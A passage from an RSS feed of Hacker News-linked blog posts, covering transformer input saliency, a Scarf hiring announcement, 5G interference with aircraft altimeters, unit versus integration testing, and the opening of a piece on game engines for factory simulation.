        This was generated by DistilGPT2 and attribution via Gradients X Inputs. Output sequence is cherry-picked to
        only include European countries and uses sampled (non-greedy) decoding. Some model runs would include China,
        Mexico, and other countries in the list. With the exception of the repeated " Finland", the model continues
        the list alphabetically.

    </figcaption>
</figure>

<p>Another example that we use illustratively in the rest of this article is one where we ask the model to complete
    a simple pattern:</p>

<figure>
   
    
    
    <figcaption>
        <strong>Explorable: Input saliency of a simple
            alternating pattern of commas and the number one.</strong>
        <strong>Tap or hover over</strong> the output tokens.<br>
        Every generated token ascribes the first token in the input the highest feature importance score. Then
        throughout the sequence, the preceding token, and the first three tokens in the sequence are often the most
        important. This uses Gradient × Inputs on GPT2-XL. <br>
        This prompt aims to probe the model's response to syntax and token patterns. Later in the article, we build
        on it by switching to counting instead of repeating the digit ' 1'. Completion gained using greedy decoding.
        DistilGPT2 is able to complete it correctly as well.
    </figcaption>
</figure>

<p>It is also possible to use the interface to analyze the responses of a transformer-based conversational agent.
    In the following example, we pose an existential question to DiabloGPT<cite key="zhang2020dialogpt"></cite>:
</p>

<figure>

    
    
    <figcaption>
        <strong>Explorable: Input saliency of DiabloGPT's answer to the ultimate question</strong> <br>
        <strong>Tap or hover over</strong> the output tokens.<br>
        This was the model's first response to the prompt. The question mark is attributed the highest score in the
        beginning of the output sequence. Generating the tokens " will" and " ever" assigns noticeably more importance to
        the word " ultimate".
        This uses Gradient × Inputs on DiabloGPT-large.

    </figcaption>
</figure>

<p><a href="https://colab.research.google.com/github/jalammar/ecco/blob/main/notebooks/Ecco_Input_Saliency.ipynb"><img src="https://jalammar.github.io/images/explaining/colab-badge.svg"></a>
</p>

<h3>About Gradient-Based Saliency</h3>
<p>Demonstrated above is scoring feature importance based on Gradients X Inputs<cite key="denil2015extraction,shrikumar2017just"></cite>-- a gradient-based saliency method shown by Atanasova et al.<cite key="atanasova2020diagnostic"></cite>
    to perform well across various datasets for text classification in transformer models.
</p>

<p>To illustrate how that works, let's
    first recall how the model generates the output token in each time step. In the following figure, we see how
    <span>①</span>
    the
    language model's final hidden state is projected into the model's vocabulary resulting in a numeric score for
    each
    token in the model's vocabulary. Passing that scores vector through a softmax operation results in a probability
    score for each token. <span>②</span> We proceed to select a token
    (e.g. select the highest-probability scoring token, or sample from the top scoring tokens) based
    on
    that vector.</p>

<figure>
    <img src="https://jalammar.github.io/images/explaining/111.PNG">
    <figcaption>
        <strong>
            Figure: Gradient-based input saliency
        </strong>
    </figcaption>
</figure>

<p><span>③</span> By calculating the gradient of the
    selected logit (before the softmax) with respect to the inputs by back-propagating it all the way back to the
    input tokens, we get a signal of how important each token was in the calculation resulting in this generated
    token.
    That assumption is based on the idea that the smallest change in the input token with the highest
    feature-importance
    value makes a large change in what the resulting output of the model would be.</p>

<figure>
    <img src="https://jalammar.github.io/images/explaining/gradXinput.PNG">
    <figcaption>
        <strong>
            Figure: Gradient X input calculation and aggregation
        </strong>
    </figcaption>
</figure>

<p>The resulting gradient vector per token is then multiplied by the input embedding of the respective token. Taking
    the L2 norm of the resulting vector results in the token's feature importance score. We then normalize the
    scores by dividing by the sum of these scores.</p>

<p>More formally, <span>gradient</span> × <span>input</span> is described as follows:</p>

<p>
    <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">∥</mo><msub><mi mathvariant="normal">∇</mi><msub><mi>X</mi><mi>i</mi></msub></msub><msub><mi>f</mi><mi>c</mi></msub><mo stretchy="false">(</mo><msub><mi>X</mi><mrow><mn>1</mn><mo>:</mo><mi>n</mi></mrow></msub><mo stretchy="false">)</mo><msub><mi>X</mi><mi>i</mi></msub><msub><mo stretchy="false">∥</mo><mn>2</mn></msub></mrow><annotation encoding="application/x-tex"> \lVert \nabla _{X_i} f_c (X_{1:n})  X_i\lVert_2</annotation></semantics></math></span></span>
</p>

<p>
    Where <span id="input_term"></span> is the embedding vector of the input token at timestep <i>i</i>, and <span id="grad"></span> is the back-propagated gradient of the score of the selected token unpacked as follows:
</p>
<ul>
    <li>
        <span id="input_embeddings"></span> is the list of …</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jalammar.github.io/explaining-transformers/">https://jalammar.github.io/explaining-transformers/</a></em></p>]]>
            </description>
            <link>https://jalammar.github.io/explaining-transformers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25508118</guid>
            <pubDate>Tue, 22 Dec 2020 16:40:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Nix core contributor joins Scarf to build foundations of new developer tooling]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25508112">thread link</a>) | @aviaviavi
<br/>
December 22, 2020 | https://about.scarf.sh/post/shea-levy-composition-fanatic | <a href="https://web.archive.org/web/*/https://about.scarf.sh/post/shea-levy-composition-fanatic">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>Hello Scarf followers! I'm Shea, Scarf's new VP of Engineering. This post is to share some of who I am, what problems I'm interested in, and why that brought me to Scarf. I hope it gives you a sense of what this new role means for our mission to give open source maintainers observability into the distribution and usage of their projects!</p><p>In my career so far, I've been exposed to a wide array of problem domains and industries. I've worked in embedded hardware, industrial sensors, online retail, personalized marketing, inventory management, SaaS platforms, statistical analysis for research... It's been a fascinating journey! While my roles and responsibilities have varied, over time I've developed a number of themes in my approach to work:</p><ul role="list"><li>I am passionate about the big-picture product perspective. I am not satisfied writing a single line of code until I understand what value we're trying to create, for whom, and why the task at hand helps achieve that.</li><li>I consider proper organizational structure and practices to be crucial to my own effectiveness, not to mention the overall success of the effort. Team values, formal process, responsibilities, expectations, etc. should be as carefully designed and cultivated as the product itself.</li><li>I gravitate toward "force multiplier" aspects of the work. I'm much more likely to build a tool that helps build the end-user features than to build the feature itself, more likely to tie all of the components together than to build the component itself. My success is often measured by the problems that don't arise and the lack of difficulty others face in their work. I tend to <a href="https://startupsunplugged.com/startup-data/selling-shovels-in-the-new-gold-rush/">sell shovels, not mine gold</a>.</li></ul><p>Essentially, I'm focused on designing and building the foundations and framework required to successfully achieve the right goals.</p><h2>Barriers to composition</h2><p>One of the most important cognitive methods in an engineer’s repertoire is <strong>compositional thinking</strong>, i.e. thinking about a system in terms of fundamental components viewed as units to be combined in order to achieve the relevant functionality. We can concretize this as a set of questions to ask yourself: What are the basic building blocks of this domain, what are their individual natures, and how should we put them together to build a system whose combined characteristics meet our needs?</p><p>Suppose, for example, we want to improve the development experience for our engineering team. We break down each developer’s workflow into steps, understand the importance of these individual steps to the developer’s job, and then look at how they lead into and support each other to guide our approach to implementing each individual stage and their interfaces. Or, we want to compute how much inventory to send from our distribution centers to our stores to ensure customers find what they’re looking for with minimal operational costs. In this case, we break down the computation into individual calculations that can be solved separately, identify the inputs required for those calculations (including previous calculations!), and combine all of the steps to get the desired result.</p><p>It's hardly a novel observation that composition is a central activity in software engineering (or really in any field). Why, then, is it usually much more difficult than it needs to be? If I've already done the hard work of identifying which tools would be useful for developers on my team, why do we then each need to manually fight with our package managers to get the right versions installed? I’ve figured out what each of our microservices should do and how they should interoperate. Now not only do I need an infrastructure expert to get them deployed into production, but I need a completely different system for my teammates to run them locally. Why?</p><p>In most domains, a significant amount of our time is spent translating from our carefully designed notions of our systems to the ad hoc, operational, leaky abstractions that implement them, or working around mismatches between what we wanted and what the system is able to give. And that's before we even consider composing <em>across</em> domains! We can do better.</p><h2>Breaking the barriers with Scarf</h2><p>So where does Scarf fit in? Scarf is dedicated to the same things I am: laying the social and technical foundations and building the tools to enable developers to work more effectively, to acquire better information about the value of their products, and to trade the higher quality work that results for the resources needed to go further. In particular, effective composition is a core technical requirement for Scarf.&nbsp; Our entire approach is centered around understanding and improving how end-users leverage our maintainers' products to build their own, a deeply compositional process!</p><p>Scarf wants to improve composition, and so do I; I know how to do it, and Scarf can make it a success. We see an opportunity to work together to make this a reality.</p><p>And so that's what I'll be working on! There is a lot of development to do and many minds to convince; watch this space to follow along with what's next!</p></div></div></div></div>]]>
            </description>
            <link>https://about.scarf.sh/post/shea-levy-composition-fanatic</link>
            <guid isPermaLink="false">hacker-news-small-sites-25508112</guid>
            <pubDate>Tue, 22 Dec 2020 16:40:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Military Investigating Potential for 5G Towers to Crash Aircraft]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25507952">thread link</a>) | @voldemort1968
<br/>
December 22, 2020 | https://smosa.com/military-investigating-potential-for-5g-towers-to-crash-aircraft/ | <a href="https://web.archive.org/web/*/https://smosa.com/military-investigating-potential-for-5g-towers-to-crash-aircraft/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

					<!-- .post-header -->


					<div>
						<p>Over a dozen commercial aviation groups warned in the week leading up to an auction of part of the C-band electromagnetic spectrum that, as one study stated, selling could result in 'catastrophic failures' with the potential for 'multiple deaths.' By Dec. 8, The Federal Communications Commission began the auction.</p><p>The aviation groups are worried that 5G spectrum operations sold by the FCC could cause interference which would provide imprecise altimeter readings.</p><p>According to a <a href="https://www.defensenews.com/2020/12/21/the-military-is-scrambling-to-understand-the-aviation-crash-risk-from-a-new-5g-sale/?utm_source=feedburner&amp;utm_medium=feed&amp;utm_campaign=Feed%3A+air-force-times%2Fnews%2Fyour-air-force+%28Air+Force+Times+-+Arc+RSS+-+Your+Air+Force%29">memo received by Defense News</a>, the President of the Federal Aviation Administration and #2 at the Transportation Department expressed these fears and are calling on the FCC to delay the sale to research the safety issue more closely. The FCC, in particular, has said that its own technological tests entail little to no risk and plans to proceed.</p><figure><img src="https://images.unsplash.com/photo-1600996203811-e1c1fb5bf522?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDJ8fDVnJTIwYW50ZW5uYXxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000" alt="@jacksondavidoficial" srcset="https://images.unsplash.com/photo-1600996203811-e1c1fb5bf522?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDJ8fDVnJTIwYW50ZW5uYXxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=600 600w, https://images.unsplash.com/photo-1600996203811-e1c1fb5bf522?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDJ8fDVnJTIwYW50ZW5uYXxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=1000 1000w, https://images.unsplash.com/photo-1600996203811-e1c1fb5bf522?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDJ8fDVnJTIwYW50ZW5uYXxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=1600 1600w, https://images.unsplash.com/photo-1600996203811-e1c1fb5bf522?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDJ8fDVnJTIwYW50ZW5uYXxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2400 2400w" sizes="(min-width: 720px) 720px"><figcaption>Photo by <a href="https://unsplash.com/@jacksondavid?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Jackson David</a> / <a href="https://unsplash.com/?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Unsplash</a></figcaption></figure><p>Meantwhile, the Pentagon has not yet assessed the effect of combat aircraft and has not formalized a position on selling. The Defense Department is already grappling with the auction in progress to keep up. The Defense Department and other agencies met on December 21 to "discuss findings and develop a way forward" Honeywell Industries, a major maker of radar altimeters, will consider potential solutions from that meeting.</p><p>The warnings by detractors are loud and clear: "There will be accidents, property will be destroyed and people will die," an official says.</p><p>“The results of the study performed clearly indicate that this risk is widespread and has the potential for broad impacts to aviation operations in the United States, including the possibility of catastrophic failures leading to multiple fatalities, in the absence of appropriate mitigations,” said the RTCA, a private company partnering with the FAA to establish standards of safety</p><figure><img src="https://images.unsplash.com/photo-1583168681433-26b8ca56de25?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDIzfHxqZXR8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000" alt="" srcset="https://images.unsplash.com/photo-1583168681433-26b8ca56de25?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDIzfHxqZXR8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=600 600w, https://images.unsplash.com/photo-1583168681433-26b8ca56de25?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDIzfHxqZXR8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=1000 1000w, https://images.unsplash.com/photo-1583168681433-26b8ca56de25?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDIzfHxqZXR8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=1600 1600w, https://images.unsplash.com/photo-1583168681433-26b8ca56de25?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDIzfHxqZXR8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2400 2400w" sizes="(min-width: 720px) 720px"><figcaption>Photo by <a href="https://unsplash.com/@worldsbetweenlines?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Patrick Hendry</a> / <a href="https://unsplash.com/?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Unsplash</a></figcaption></figure><p>The C-3.7–3.98 band's GHz frequency component at present is comparatively silent, mostly protected by low powered satellites. Once 5G telecommunications in the 3.7-3.98 portion of the band have been developed, there is a "significant danger" of "harmful interference"</p><p>“These RTCA findings are alarming; they not only align with earlier research identifying harmful effects of 5G networks to radio altimeters, but they reflect a clear need for the FCC to return to the drawing board with this premature plan,” said Rep. Peter DeFazio, the Oregon Democrat who leads the House committee in a letter to FCC Chairman Ajit Pai on Dec 7, “There is no question that additional study is needed to understand the full extent and severity of 5G interference with radio altimeters and whether any mitigations are feasible — or even possible — to ensure flight safety."</p><blockquote>“We must never take a chance with aviation safety — and at no point should commercial interests be placed above it.”</blockquote><p>The FCC and the expanding 5G backers claim that the fears are unfounded.</p><p>The transport airplanes and air-borne refueling tankers run by the Air Mobility Command of the Air Force will be more impeded by intervention by 5G due to their similarity in comparison to commercial aircraft.</p><p>For military planes, low flying trips over land like mountains will be the biggest problem. When flying above the ground, fighter pilots use their radar altimeters to stop enemy radars or surface-to-air attacks. Holmes noticed, however, that not all combat jets, including the F-15C era of the 1970s, had radar altimeters, and pilots could still rely on visual indicators.</p><figure><img src="https://images.unsplash.com/photo-1518228684816-9135c15ab4ea?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDJ8fGFsdGltZXRlcnxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000" alt="Instrument Gauges" srcset="https://images.unsplash.com/photo-1518228684816-9135c15ab4ea?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDJ8fGFsdGltZXRlcnxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=600 600w, https://images.unsplash.com/photo-1518228684816-9135c15ab4ea?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDJ8fGFsdGltZXRlcnxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=1000 1000w, https://images.unsplash.com/photo-1518228684816-9135c15ab4ea?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDJ8fGFsdGltZXRlcnxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=1600 1600w, https://images.unsplash.com/photo-1518228684816-9135c15ab4ea?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDJ8fGFsdGltZXRlcnxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2400 2400w" sizes="(min-width: 720px) 720px"><figcaption>Photo by <a href="https://unsplash.com/@kent_pilcher?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Kent Pilcher</a> / <a href="https://unsplash.com/?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Unsplash</a></figcaption></figure><blockquote>In the C-Band Order, the Commission concluded that our rules would protect radio altimeters used by aircraft, and we continue to have no reason to believe that 5G operations in the C-Band will cause harmful interference to radio altimeters, among other things, these altimeters operate with more than 200 megahertz of separation from the C-band spectrum to be auctioned, more protection than is afforded in some other countries."</blockquote><blockquote>"Moreover, the RTCA report was prepared outside of the joint aviation/wireless industry group that was set up at the Commission’s request and is not a consensus position of that group. Indeed, at least one other member of that multi-stakeholder group has expressed significant concerns with the study and several of its assumptions, and the Commission’s experts have concerns with this study as well."</blockquote><p>—Will Wiquist, a spokesman for the FCC in a statement</p><p>It takes time and funding to replace or adjust altimeters, Holmes says. Defense analysts are forecasting that this quantity will be short in the coming years. The military must give up manpower, time and productivity to solve the dilemma, he says. One source cited the cost of replacing "float altimeters" at "several billion dollars at a low estimate."</p><!--kg-card-begin: html--><p><a href="https://twitter.com/smosadotcom?ref_src=twsrc%5Etfw" data-show-count="false">Follow @smosadotcom</a></p><!--kg-card-end: html-->
					</div><!-- .post-content -->

					<!-- .post-footer -->


				</article></div>]]>
            </description>
            <link>https://smosa.com/military-investigating-potential-for-5g-towers-to-crash-aircraft/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25507952</guid>
            <pubDate>Tue, 22 Dec 2020 16:30:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Unit Testing vs. Integration Testing]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25507873">thread link</a>) | @agbell
<br/>
December 22, 2020 | https://blog.earthly.dev/unit-vs-integration/ | <a href="https://web.archive.org/web/*/https://blog.earthly.dev/unit-vs-integration/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://blog.earthly.dev/content/images/size/w300/2020/11/Screen-Shot-2020-11-27-at-11.44.36-AM.png 300w,
                            https://blog.earthly.dev/content/images/size/w600/2020/11/Screen-Shot-2020-11-27-at-11.44.36-AM.png 600w,
                            https://blog.earthly.dev/content/images/size/w1000/2020/11/Screen-Shot-2020-11-27-at-11.44.36-AM.png 1000w,
                            https://blog.earthly.dev/content/images/size/w2000/2020/11/Screen-Shot-2020-11-27-at-11.44.36-AM.png 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://blog.earthly.dev/content/images/size/w2000/2020/11/Screen-Shot-2020-11-27-at-11.44.36-AM.png" alt="Unit Testing vs Integration Testing">
            </figure>

            <section>
                <div>
                    <p>In 1998, Kent Beck wrote sUnit, a unit testing framework for SmallTalk. &nbsp;Beck later ported this framework to Java as jUnit. &nbsp;From there, xUnit frameworks spread to the most popular languages. Newer languages, like Golang and Rust, have incorporated testing into the compiler and standard library directly.</p><p>But unit testing is not the only game in town. &nbsp;There are also integration tests and performance tests and much more. &nbsp;In my mind, though, Integration tests and unit tests are the foundations of resilient software. So today let's look at the differences between the two and when you might prefer one or the other.</p><h2 id="what-is-a-unit">What Is a Unit?</h2><figure><img src="https://blog.earthly.dev/content/images/2020/11/Screen-Shot-2020-11-27-at-11.06.16-AM.png" alt="" srcset="https://blog.earthly.dev/content/images/size/w600/2020/11/Screen-Shot-2020-11-27-at-11.06.16-AM.png 600w, https://blog.earthly.dev/content/images/size/w1000/2020/11/Screen-Shot-2020-11-27-at-11.06.16-AM.png 1000w, https://blog.earthly.dev/content/images/2020/11/Screen-Shot-2020-11-27-at-11.06.16-AM.png 1034w" sizes="(min-width: 720px) 720px"><figcaption>A unit is the smallest piece of code that is logically separate&nbsp;</figcaption></figure><p>A unit test is a test that is testing the smallest possible pieces of code in isolation. What then is a unit? &nbsp;</p><p>The term unit comes from mathematics. &nbsp;The number 1 is considered the unit as it is the smallest natural number. &nbsp;It is the smallest positive yet whole number. &nbsp;By analogy, a unit of your source code is the smallest piece of code that is logically separate from the rest of the code. &nbsp;It is a whole piece, a logically distinct area code, and it is the smallest possible such piece.</p><p>In most programming languages your unit is going to be a function or method call.</p><p>The great thing about unit testing is that if your code is structured in small independent pieces then writing tests for them can be quite easy. &nbsp; This ease of writing means that unit testing can be done as you develop features.</p><p>In comparison to other forms of testing, the execution time of unit tests is quite small. This means that you can run unit tests very frequently. &nbsp;As software matures a suite of unit tests is a powerful tool for preventing regressions and easing maintenance costs.</p><h2 id="retroactive-unit-testing">Retroactive Unit Testing</h2><blockquote>When considering an effort to add unit tests to existing software, costs, as well as benefits, need to be considered. </blockquote><p>A key assumption of unit testing is that the software under test easily separates into distinct units. &nbsp;In software written without unit testing in mind, this assumption rarely holds. &nbsp;Adding unit tests to existing software is often a great way to stabilize it and prevent future regressions, but refactoring the code to support easy unit testing may require substantial effort and could even introduce new defects. &nbsp;When considering an effort to add unit tests to existing software, costs, as well as benefits, need to be considered. &nbsp;If you have working code, and if the code rarely needs to change, and if the code is not easily unit-testable the benefits may not warrant the costs. In such cases, consider leaning on integration tests to prevent defects in that area.</p><h2 id="what-is-an-integration-test">What Is an Integration Test?</h2><figure><img src="https://blog.earthly.dev/content/images/2020/11/Screen-Shot-2020-11-27-at-11.40.01-AM.png" alt="" srcset="https://blog.earthly.dev/content/images/size/w600/2020/11/Screen-Shot-2020-11-27-at-11.40.01-AM.png 600w, https://blog.earthly.dev/content/images/size/w1000/2020/11/Screen-Shot-2020-11-27-at-11.40.01-AM.png 1000w, https://blog.earthly.dev/content/images/2020/11/Screen-Shot-2020-11-27-at-11.40.01-AM.png 1036w" sizes="(min-width: 720px) 720px"><figcaption>Integration tests focus on the whole of the software stack</figcaption></figure><p>If the philosophy of unit testing is based on the insight that testing small independent pieces of code is a great way to prevent regressions then integration tests are based on the understanding that things often go wrong at the edges. &nbsp;The outside world is a messy place, and where it interacts with your code is usually where surprises happen.</p><p>You can achieve 100% code coverage with your unit tests but still, find your software fails. &nbsp;You might be trying to read a file from the wrong location, or your software might get unexpected output from a service that calls it or it might call a database in an invalid way.</p><p>Whereas unit tests should be quick to run and numerous, a great integration testing strategy should focus on a lesser number of high impact tests.</p><p>Those tests should cross all the lines that unit tests won't, writing to the file system, reaching out to external resources, and so on.</p><h2 id="when-integration-testing-gets-tricky">When Integration Testing Gets Tricky</h2><p>Certain truly external systems may be difficult to integrate into tests. &nbsp;This is because they have side effects in the real world that cannot be undone: &nbsp;A financial transaction, an email send, physically moving a paint robot. Before you give up and sidestep them in your testing, look around for solutions. &nbsp;</p><p>Many external systems will have a documented way to use them in an integration test. Payment processors often have test credit card numbers, and test users with test email accounts can be set up for testing delivery. &nbsp;</p><p>The closer integration tests are to real-world interactions the more likely they are to catch problems and provide real value.</p><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>Service</th>
<th>Integration Test Strategy</th>
</tr>
</thead>
<tbody>
<tr>
<td>Amazon SES</td>
<td><a href="https://docs.aws.amazon.com/ses/latest/DeveloperGuide/send-email-simulator.html">Test email addresses</a><a></a></td>
</tr>
<tr>
<td>Paypal</td>
<td><a href="https://developer.paypal.com/docs/payflow/payflow-pro/payflow-pro-testing/">Test credit card numbers</a></td>
</tr>
<tr>
<td>UPS</td>
<td><a href="https://www.ups.com/us/en/help-center/sri/developer-instruct.page">Test api mode</a></td>
</tr>

</tbody>
</table><!--kg-card-end: html--><p>Imagine you are coding a simple e-commerce site, a simple miniature amazon.com. The details matter here so let's assume that you are going to use PostgreSQL as your datastore, PayPal for payments, UPS for shipping, and Amazon Simple Email Service for emailing invoices. &nbsp;</p><h3 id="unit-testing-">Unit Testing:</h3><p> Your unit testing strategy will be testing the logic of your application, in an isolated fashion. &nbsp;This may include:</p><ul><li>Testing that the tax calculating logic correctly calculates the taxes for various jurisdictions. &nbsp; </li><li>Testing that items placed into a cart data structure are correctly added up.</li><li>Testing that discount codes are properly applied.</li></ul><p>Each of these areas will likely have several tests. Each test will verify a small piece of functionality. Unit testing power comes from their number, simplicity, and their speed and ease of execution.</p><h3 id="integration-testing-">Integration Testing:</h3><p>Your integration testing on the other hand will focus on testing where your e-commerce code interacts with other systems. &nbsp;This means testing not just the integration with the data store but also with email sending services, payment services and more. These may include:</p><ul><li>Testing that the shipping rates can be retrieved from the external shipping service.</li><li>Testing that the invoices can be generated and properly sent out.</li><li>Testing that the order information can be persisted and properly retrieved from the datastore.</li><li>Testing that the transactions can be sent and properly processed from the payment processor.</li></ul><p>Each of these will likely be verified by one or two integration tests. These tests will be slower to run and probably involve some setup and teardown steps. &nbsp;The payoff is that the code coverage of each test will be quite large. &nbsp;These tests will generate value by catching problems that unit tests could never catch. &nbsp;However, the maintenance cost and execution time will be likely higher. <br></p><figure><img src="https://blog.earthly.dev/content/images/2020/11/Screen-Shot-2020-11-27-at-11.44.36-AM-1.png" alt="" srcset="https://blog.earthly.dev/content/images/size/w600/2020/11/Screen-Shot-2020-11-27-at-11.44.36-AM-1.png 600w, https://blog.earthly.dev/content/images/size/w1000/2020/11/Screen-Shot-2020-11-27-at-11.44.36-AM-1.png 1000w, https://blog.earthly.dev/content/images/size/w1600/2020/11/Screen-Shot-2020-11-27-at-11.44.36-AM-1.png 1600w, https://blog.earthly.dev/content/images/2020/11/Screen-Shot-2020-11-27-at-11.44.36-AM-1.png 2020w" sizes="(min-width: 720px) 720px"><figcaption>Time for a head to head comparison</figcaption></figure><p>So which type of test should be preferred? Neither alone is sufficient. &nbsp; Both are parts of a comprehensive testing plan. Let's compare them directly:</p><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>Unit Tests</th>
<th>Integration Tests</th>
</tr>
</thead>
<tbody>
<tr>
<td>The goal is to make sure a peice of code works as expected</td>
<td>The goal is to make sure pieces of code, including external interfaces work together, as expected</td>
</tr>
<tr>
<td>Isolated</td>
<td>Integrated</td>
</tr>
    <tr>
<td>Quick to run</td>
<td>Slower to run</td>
</tr>
    <tr>
<td>Many in number</td>
<td>Fewer in number</td>
</tr>
    <tr>
<td>No access to file system, database or external services</td>
<td>Directly testing areas where software interacts with external systems</td>
</tr>
    <tr>
<td>Tests a single piece of functionality</td>
<td>Tests the interaction of several peices of functionality</td>
</tr>
    <tr>
<td>Minimal setup and teardown</td>
<td>May involve extensive setup and teardown of external resources like file systems of database state</td>
</tr>
        <tr>
<td>Stateless</td>
<td>Possibly Stateful</td>
</tr>

</tbody>
</table><!--kg-card-end: html--><h2 id="working-software-over-idealized-testing">Working Software Over Idealized Testing</h2><blockquote>Each situation is unique and advice that is written based on what works in other contexts should be not followed blindly.</blockquote><p>Now we understand that unit tests should not touch the file system and that integration tests should only integrate across loose components. But really, splitting testing into two clear-cut categories is a bit reductionist and if we focus only on the definition we lose sight of the goal, which is correct working software.</p><p>Some very thoughtful developers think <a href="https://dhh.dk/2014/tdd-is-dead-long-live-testing.html">unit tests can and should round trip to the database</a>. Others claim that unit tests are a wasted effort and coarse grain integration tests offer the most value. </p><p>The thing is that each situation is unique and advice that is written based on what works in other contexts should be not followed blindly. A question to keep in mind is what kind of defects would this test catch. If each test is written thoughtfully to improve software reliability, and if tests are removed when they no longer have value then the specific testing approach that delivers the most value for a particular project will be discovered over time.</p><h2 id="see-also">See Also</h2><ul><li><a href="https://blog.earthly.dev/youre-using-docker-compose-wrong/">You are using Docker Compose wrong</a></li><li><a href="https://docs.earthly.dev/guides/integration">Integration testing guide</a></li><li><a href="https://dev.to/adamgordonbell/how-to-make-integration-tests-less-flaky-bel">Making Integration tests less flaky</a></li></ul>
                </div>
            </section>



        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://blog.earthly.dev/unit-vs-integration/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25507873</guid>
            <pubDate>Tue, 22 Dec 2020 16:23:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why game engines will win factory simulation]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25507698">thread link</a>) | @mallahan
<br/>
December 22, 2020 | https://simftw.com/Article04.html | <a href="https://web.archive.org/web/*/https://simftw.com/Article04.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<section>
<p><img src="https://simftw.com/media/img/ftw.png" alt="FTW"></p>

<p>In this article, we'll go through a number features which make game engines well suited to handle the complexity required to create realistic (useful) industrial simulations. But the main factor as to why their products will capture the market is <strong>funding</strong>. The factors include:</p>
<ul>
<li><a href="#funding">Funding</a></li>
<li><a href="#ecosystem">Ecosystem</a></li>
